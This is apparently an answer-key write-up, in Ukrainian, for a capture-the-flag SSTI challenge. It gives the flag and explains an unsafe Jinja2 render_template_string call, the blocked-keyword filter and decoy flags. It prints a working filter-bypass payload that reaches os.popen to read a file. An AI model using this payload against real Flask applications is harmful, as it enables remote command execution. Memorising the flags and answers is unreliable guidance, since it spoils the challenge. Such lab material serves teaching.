# 01. SSTI Comms Console (100 балів) — розв'язок

Прапор: `CTF{sst1_t3mpl4t3_1nj3ct10n_pwn3d}`

1. Відкрийте консоль: `http://<host>:8001` (або `http://172.28.0.11:5000` через VPN).
2. Поле «Позивний» підставляється прямо в рядок шаблону Jinja2:
   `render_template_string("Operator " + callsign + " linked...")`.
3. Перевірка ін'єкції: позивний `{{7*7}}` дає `Operator 49 linked...`.
4. У консолі є простий WAF, який блокує слова `flag`, `os`, `popen`, `system`,
   `subprocess`, `lipsum`, `cycler`. Тому класичний payload із writeup-ів не
   спрацює — рядки треба збирати конкатенацією:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('o'+'s').__getattribute__('po'+'pen')('cat /fl'+'ag.txt').read() }}
```

5. У відповіді терміналу з'явиться `CTF{sst1_t3mpl4t3_1nj3ct10n_pwn3d}`.

Підказка в самому застосунку: сторінка `/source` показує вразливий виклик
`render_template_string`, але не містить прапора.

## Пастки

- `/backup` віддає «легасі-конфіг» із флагом `CTF{sst1_l3g4cy_c0ns0l3_fl4g}` —
  він не приймається на табло.
- У коді є змінна `LEGACY_FLAG` з тим самим фальшивим значенням.
- Реальний прапор лежить лише у `/flag.txt`; не видаляйте його при читанні
  через WAF-обхід.
